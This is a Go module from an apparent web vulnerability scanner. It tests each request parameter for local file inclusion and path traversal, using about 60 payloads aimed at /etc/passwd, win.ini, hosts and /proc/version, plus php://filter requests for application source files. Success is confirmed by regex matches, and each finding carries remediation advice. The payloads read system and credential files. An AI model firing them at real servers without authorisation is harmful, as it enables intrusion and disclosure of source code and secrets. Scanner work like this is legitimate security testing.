package modules

import (
	"encoding/base64"
	"nightfalllx/pkg/client"
	"nightfalllx/pkg/wordlists"
	"regexp"
	"strings"
	"sync"
)

type LFIModule struct{}

func NewLFIModule() *LFIModule {
	return &LFIModule{}
}

func (m *LFIModule) Name() string {
	return "lfi"
}

func (m *LFIModule) Description() string {
	return "Local File Inclusion and Path Traversal verification"
}

var (
	rootPasswdRegex  = regexp.MustCompile(`root:[^:]*?:0:0:`)
	winIniRegex      = regexp.MustCompile(`(?i)\[(?:fonts|extensions|files)\]`)
	winHostsRegex    = regexp.MustCompile(`(?i)127\.0\.0\.1\s+localhost`)
	procVersionRegex = regexp.MustCompile(`(?i)Linux version \d+\.\d+`)
	base64BlobRegex  = regexp.MustCompile(`(?:[A-Za-z0-9+/]{4}){4,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?`)
)

type traversalEntry struct {
	Payload string
	Regex   *regexp.Regexp
}

var (
	lfiOnce              sync.Once
	allTraversalPayloads []traversalEntry
)

func getTraversalPayloads() []traversalEntry {
	lfiOnce.Do(func() {
		allTraversalPayloads = append([]traversalEntry{}, traversalPayloads...)
		seen := make(map[string]bool)
		for _, p := range traversalPayloads {
			seen[p.Payload] = true
		}

		for _, p := range wordlists.LoadLFI() {
			p = strings.TrimSpace(p)
			if p == "" || seen[p] {
				continue
			}
			lower := strings.ToLower(p)
			var rx *regexp.Regexp
			if strings.Contains(lower, "passwd") || strings.Contains(lower, "shadow") {
				rx = rootPasswdRegex
			} else if strings.Contains(lower, "win.ini") || strings.Contains(lower, "boot.ini") {
				rx = winIniRegex
			} else if strings.Contains(lower, "hosts") {
				rx = winHostsRegex
			} else if strings.Contains(lower, "version") {
				rx = procVersionRegex
			}
			if rx != nil {
				seen[p] = true
				allTraversalPayloads = append(allTraversalPayloads, traversalEntry{Payload: p, Regex: rx})
			}
		}
	})
	return allTraversalPayloads
}

/*
CATEGORY: LFI & Path Traversal Vectors (60+ entries)
Sources: OWASP Web Security Testing Guide (WSTG-INPV-12), HackTricks LFI Cheat Sheet.
Contexts:
- Standard Unix relative traversal (/etc/passwd)
- Deep traversal (8 to 16 levels)
- Root absolute paths
- URL-encoded slashes (%2f, %252f, %c0%af)
- Path filter bypasses (....//, ..././, ......\)
- Null-byte terminators (%00)
- Windows win.ini & hosts file traversals (forward and backslashes)
- Linux /proc virtual filesystem inspection
*/
var traversalPayloads = []traversalEntry{
	// 1. Standard Unix /etc/passwd (depth 4 to 12)
	{"../../../../etc/passwd", rootPasswdRegex},
	{"../../../../../etc/passwd", rootPasswdRegex},
	{"../../../../../../etc/passwd", rootPasswdRegex},
	{"../../../../../../../etc/passwd", rootPasswdRegex},
	{"../../../../../../../../etc/passwd", rootPasswdRegex},
	{"../../../../../../../../../../etc/passwd", rootPasswdRegex},
	{"../../../../../../../../../../../../etc/passwd", rootPasswdRegex},
	{"../../../../../../../../../../../../../../etc/passwd", rootPasswdRegex},
	{"../../../../../../../../../../../../../../../../etc/passwd", rootPasswdRegex},

	// 2. Absolute Path & Root Reference
	{"/etc/passwd", rootPasswdRegex},
	{"/etc/passwd%00", rootPasswdRegex},
	{"/etc/passwd%00.jpg", rootPasswdRegex},
	{"/etc/passwd%00.html", rootPasswdRegex},

	// 3. Null-Byte Injections
	{"../../../../etc/passwd%00", rootPasswdRegex},
	{"../../../../../../../../etc/passwd%00", rootPasswdRegex},
	{"../../../../../../../../etc/passwd%00.png", rootPasswdRegex},
	{"../../../../../../../../etc/passwd\x00", rootPasswdRegex},

	// 4. URL Encoded Slashes (Single Encoding)
	{"..%2f..%2f..%2f..%2fetc%2fpasswd", rootPasswdRegex},
	{"..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", rootPasswdRegex},
	{"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", rootPasswdRegex},
	{"%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", rootPasswdRegex},
	{".%2e/.%2e/.%2e/.%2e/etc/passwd", rootPasswdRegex},

	// 5. Double URL Encoded Slashes
	{"..%252f..%252f..%252f..%252fetc%252fpasswd", rootPasswdRegex},
	{"..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd", rootPasswdRegex},
	{"%252e%252e%252f%252e%252e%252fetc%252fpasswd", rootPasswdRegex},

	// 6. Nested Stripping Filter Bypasses
	{"....//....//....//etc/passwd", rootPasswdRegex},
	{"....//....//....//....//....//....//etc/passwd", rootPasswdRegex},
	{"..././..././..././..././etc/passwd", rootPasswdRegex},
	{"....\\/....\\/....\\/etc/passwd", rootPasswdRegex},
	{"....\\\\....\\\\....\\\\etc/passwd", rootPasswdRegex},

	// 7. Non-standard & Overlong UTF-8 encodings
	{"..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd", rootPasswdRegex},
	{"..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd", rootPasswdRegex},

	// 8. Linux /proc Filesystem
	{"../../../../proc/version", procVersionRegex},
	{"../../../../../../../../proc/version", procVersionRegex},
	{"/proc/version", procVersionRegex},

	// 9. Windows win.ini (forward slashes)
	{"../../../../windows/win.ini", winIniRegex},
	{"../../../../../../windows/win.ini", winIniRegex},
	{"../../../../../../../../windows/win.ini", winIniRegex},
	{"../../../../../../../../../../windows/win.ini", winIniRegex},
	{"/windows/win.ini", winIniRegex},
	{"c:/windows/win.ini", winIniRegex},
	{"c:\\windows\\win.ini", winIniRegex},

	// 10. Windows win.ini (backslashes)
	{"..\\..\\..\\..\\windows\\win.ini", winIniRegex},
	{"..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini", winIniRegex},
	{"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini", winIniRegex},
	{"..%5c..%5c..%5c..%5cwindows%5cwin.ini", winIniRegex},
	{"..%255c..%255c..%255c..%255cwindows%255cwin.ini", winIniRegex},

	// 11. Windows hosts file
	{"../../../../windows/system32/drivers/etc/hosts", winHostsRegex},
	{"../../../../../../../../windows/system32/drivers/etc/hosts", winHostsRegex},
	{"..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", winHostsRegex},
	{"..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", winHostsRegex},
	{"c:/windows/system32/drivers/etc/hosts", winHostsRegex},
}

func (m *LFIModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
	var findings []*Finding
	isPost := strings.ToUpper(target.Method) == "POST"

	headers := map[string]string{}
	if target.IsJSON {
		headers["Content-Type"] = "application/json"
	}

	for _, param := range target.Parameters() {
		// 1. PHP Filter checks (both with and without .php for appended extensions)
		phpFilters := []string{
			"php://filter/convert.base64-encode/resource=index.php",
			"php://filter/convert.base64-encode/resource=index",
			"php://filter/read=convert.base64-encode/resource=index.php",
			"php://filter/read=convert.base64-encode/resource=index",
			"php://filter/resource=index.php",
			"php://filter/convert.base64-encode/resource=config.php",
			"php://filter/convert.base64-encode/resource=config",
			"php://filter/convert.base64-encode/resource=login.php",
			"php://filter/convert.base64-encode/resource=login",
		}
		for _, phpFilterPayload := range phpFilters {
			var filterResp *client.Response
			var err error
			if isPost {
				filterResp, err = c.Request("POST", target.URL, target.BuildBodyWithParam(param, phpFilterPayload), headers)
			} else {
				filterResp, err = c.Request("GET", target.BuildURLWithParam(param, phpFilterPayload), "", nil)
			}

			if err == nil && filterResp != nil && filterResp.Body != "" {
				blobs := base64BlobRegex.FindAllString(filterResp.Body, -1)
				for _, blob := range blobs {
					padded := blob + strings.Repeat("=", (4-len(blob)%4)%4)
					decoded, decErr := base64.StdEncoding.DecodeString(padded)
					if decErr == nil && (strings.Contains(string(decoded), "<?php") || strings.Contains(string(decoded), "<?=")) {
						f := &Finding{
							Module:      m.Name(),
							Title:       "Local File Inclusion (PHP Stream Filter)",
							Severity:    SeverityHigh,
							URL:         target.URL,
							Parameter:   param,
							Payload:     phpFilterPayload,
							Detail:      "PHP source code disclosure confirmed via php://filter base64 stream wrapper.",
							Evidence:    "Decoded base64 stream contained PHP script markers (<?php).",
							Remediation: "Disable PHP stream wrappers in user-controlled file inclusion and validate against an allow-list.",
							CWEID:       98,
						}
						f.SetConfidence(ConfidenceConfirmed)
						findings = append(findings, f)
						break
					}
				}
			}
		}

		// 2. Traversal path checks
		for _, tPayload := range getTraversalPayloads() {
			var resp *client.Response
			var err error

			if isPost {
				resp, err = c.Request("POST", target.URL, target.BuildBodyWithParam(param, tPayload.Payload), headers)
			} else {
				resp, err = c.Request("GET", target.BuildURLWithParam(param, tPayload.Payload), "", nil)
			}

			if err != nil || resp == nil || resp.Body == "" {
				continue
			}

			if tPayload.Regex.MatchString(resp.Body) {
				evidence := tPayload.Regex.FindString(resp.Body)
				f := &Finding{
					Module:      m.Name(),
					Title:       "Local File Inclusion / Directory Traversal",
					Severity:    SeverityCritical,
					URL:         target.URL,
					Parameter:   param,
					Payload:     tPayload.Payload,
					Detail:      "Sensitive system file disclosure confirmed via relative path traversal payload.",
					Evidence:    evidence,
					Remediation: "Use basename filtering, normalize paths with secure canonicalization, or implement a strict lookup table.",
					CWEID:       22,
				}
				f.SetConfidence(ConfidenceConfirmed)
				findings = append(findings, f)
				break
			}
		}
	}

	return findings, nil
}
